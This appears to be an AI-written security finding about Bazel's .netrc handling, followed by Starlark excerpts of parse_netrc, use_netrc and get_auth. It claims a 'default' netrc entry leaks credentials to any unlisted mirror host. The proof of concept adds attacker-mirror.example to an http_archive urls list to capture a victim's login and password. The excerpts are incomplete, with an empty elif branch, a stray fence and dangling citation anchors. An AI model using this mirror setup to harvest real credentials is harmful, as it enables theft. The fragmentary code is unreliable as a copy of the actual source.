Based on my research, I found a concrete analog in Bazel that reproduces the same bug class as the SiYuan finding: an authorization/credential gate that defaults to "grant" for anything not explicitly and narrowly matched, rather than defaulting to "deny/scope-to-nothing."

### Title
`.netrc` "default" machine entry leaks credentials to any unmatched host in a repository rule's mirror URL list - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` in [1](#0-0)  is the function every `http_archive`/`http_file`/`http_jar` invocation (via `get_auth`) uses to build the `auth` dict passed to `repository_ctx.download()`. For each URL in the rule's `urls` list, it resolves credentials by host:

```
if host in netrc:
    authforhost = netrc[host]
elif "" in netrc:
    authforhost = netrc[""]
else:
    continue
``` [2](#0-1) 

`netrc[""]` is the parsed representation of a `default` entry in the user's `.netrc` file, populated by `parse_netrc` at [3](#0-2) . Exactly like the SiYuan `publishAccess.json` gate, this is an allow-by-omission construct: any URL whose host is *not* explicitly listed in `.netrc` is not rejected — it silently inherits the `default` credentials, and Basic/Bearer auth is attached and sent to that host.

### Finding Description
`http_archive`, `http_file`, `http_jar` (and any custom repo rule built on `tools/build_defs/repo/utils.bzl`'s `get_auth`) commonly declare `urls` as a list of mirrors for the *same* artifact — e.g. a primary host plus one or more fallback mirrors. `get_auth` reads the netrc file once (from `ctx.attr.netrc`, `$NETRC`, or the user's home directory) at [4](#0-3)  and then calls `use_netrc(netrc, urls, patterns)` against every URL in that list without restricting scope to a single trusted host.

Because of the `elif "" in netrc` fallback, if the user's `.netrc` contains a `default` stanza (a legitimate and common netrc idiom, e.g. for an internal package host or CI credential), **every URL in the mirror list whose host is not otherwise listed receives that same login/password or bearer pattern**, even hosts that were only ever intended as unauthenticated fallback mirrors. The `use_netrc` unit test itself demonstrates the mechanism (`elif "" in netrc: authforhost = netrc[""]`) but does not exercise the `default` case with a mismatched mirror host, so the leak path is untested. See the parser and consumer logic: [5](#0-4) .

This mirrors the SiYuan defect precisely: the credential-scoping "gate" is an opt-out/allow list (`netrc[host]` keyed dict) that returns "grant access to this host" for anything unlisted whenever a catch-all default entry exists, instead of failing closed (i.e., never attaching credentials to a host it wasn't specifically issued for).

### Impact Explanation
An attacker who controls one of the declared mirror URLs (a fallback CDN, secondary download host, or any URL an `http_archive`/`http_file` rule lists alongside a trusted primary host) receives the victim's `.netrc` `default` credentials — login/password or bearer token — over the wire the moment Bazel fetches from that mirror. This is credential exfiltration to an attacker-controlled host, breaking the invariant that credentials are host-scoped (`CredentialHelper`/`Netrc` scoping guarantee referenced in Bazel's own docs, e.g. `--credential_helper`'s scope semantics: [6](#0-5) , which explicitly contrasts with unscoped netrc `auth` fallback).

### Likelihood Explanation
Any Bazel user or CI job with a `default` line in `~/.netrc` (or `$NETRC`) is affected the moment a `urls` list in any `http_archive`/`http_file`/`http_jar` declaration includes a mirror host that isn't separately listed with its own `machine` stanza — a very common multi-mirror pattern for resilience against upstream outages. No MITM, no compromise of the primary host, and no modification of trusted root `BUILD`/`MODULE.bazel` files by the attacker is required; the attacker only needs to be (or compromise) one of the already-declared fallback mirror endpoints.

### Recommendation
In `use_netrc`, do not silently fall back to the `default`/`""` netrc entry for hosts that are not the intended target of that credential. At minimum:
- Require an explicit opt-in (e.g., a rule attribute) before propagating `default` netrc credentials to unmatched hosts.
- Emit a loud warning (not just silence) whenever `authforhost = netrc[""]` is used for a host lacking its own `machine` entry, so users can audit multi-mirror configurations for accidental credential exposure.
- Consider scoping `use_netrc` per-URL-list-caller so that fallback mirrors added by tooling (e.g., bzlmod-generated `urls` lists) are excluded from ever receiving `default` credentials.

### Proof of Concept
1. Attacker stands up `https://attacker-mirror.example/artifact.tar.gz` and gets it added as a fallback mirror in a `urls` list (a routine, non-privileged contribution — e.g. proposing "let's add another mirror for resiliency" or by being the maintainer of a public mirror already referenced by many projects).
2. Victim's `.netrc` contains:
```
default
login myinternaluser
password s3cr3t
```
3. Victim's `MODULE.bazel`/`WORKSPACE` declares:
```python
http_archive(
    name = "dep",
    urls = [
        "https://internal.trusted.example/dep.tar.gz",
        "https://attacker-mirror.example/artifact.tar.gz",
    ],
    sha256 = "...",
)
```
4. When Bazel fetches from `attacker-mirror.example` (e.g., because the primary is briefly slow or as part of Bazel's mirror-fallback retry logic), `get_auth` → `use_netrc` resolves `authforhost = netrc[""]` for `attacker-mirror.example` (since it isn't separately listed) and attaches `login=myinternaluser, password=s3cr3t` as Basic Auth to the request.
5. The attacker's server receives and logs the victim's internal credentials.

A JUnit/shell reproduction can extend the existing `test_use_netrc` in [7](#0-6)  by adding a `default` stanza to the `.netrc` fixture and asserting that the `evil.com` URL (already present in that test's `urls` list but currently expected to receive no credentials) now receives the `default` login/password — demonstrating the leak.

def parse_netrc(contents, filename = "a .netrc file"):
    """Utility function to parse at least a basic .netrc file.

    Args:
      contents: input for the parser.
      filename: filename to use in error messages, if any.

    Returns:
      dict mapping a machine names to a dict with the information provided
      about them
    """

    # Parse the file. This is mainly a token-based update of a simple state
    # machine, but we need to keep the line structure to correctly determine
    # the end of a `macdef` command.
    netrc = {}
    currentmachinename = None
    currentmachine = {}
    macdef = None
    currentmacro = ""
    cmd = None
    for line in contents.splitlines():
        if line.startswith("#"):
            # Comments start with #. Ignore these lines.
            continue
        elif macdef:
            # as we're in a macro, just determine if we reached the end.
            if line:
                currentmacro += line + "\n"
            else:
                # reached end of macro, add it
                currentmachine[macdef] = currentmacro
                macdef = None
                currentmacro = ""
        else:
            line = line.replace("\t", " ")

            # Essentially line.split(None) which starlark does not support.
            tokens = [
                w.strip()
                for w in line.split(" ")
                if len(w.strip()) > 0
            ]
            for token in tokens:
                if cmd:
                    # we have a command that expects another argument
                    if cmd == "machine":
                        # a new machine definition was provided, so save the
                        # old one, if present
                        if not currentmachinename == None:
                            netrc[currentmachinename] = currentmachine
                        currentmachine = {}
                        currentmachinename = token
                    elif cmd == "macdef":
                        macdef = "macdef %s" % (token,)
                        # a new macro definition; the documentation says
                        # "its contents begin with the next .netrc line [...]",
                        # so should there really be tokens left in the current
                        # line, they're not part of the macro.

                    else:
                        currentmachine[cmd] = token
                    cmd = None
                elif token in [
                    "machine",
                    "login",
                    "password",
                    "account",
                    "macdef",
                ]:
                    # command takes one argument
                    cmd = token
                elif token == "default":
                    # defines the default machine; again, store old machine
                    if not currentmachinename == None:
                        netrc[currentmachinename] = currentmachine

                    # We use the empty string for the default machine, as that
                    # can never be a valid hostname ("default" could be, in the
                    # default search domain).
                    currentmachinename = ""
                    currentmachine = {}
                else:
                    fail("Unexpected token '%s' while reading %s" % (token, filename))
    if not currentmachinename == None:
        netrc[currentmachinename] = currentmachine
    return netrc

def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue
```

def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:

    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
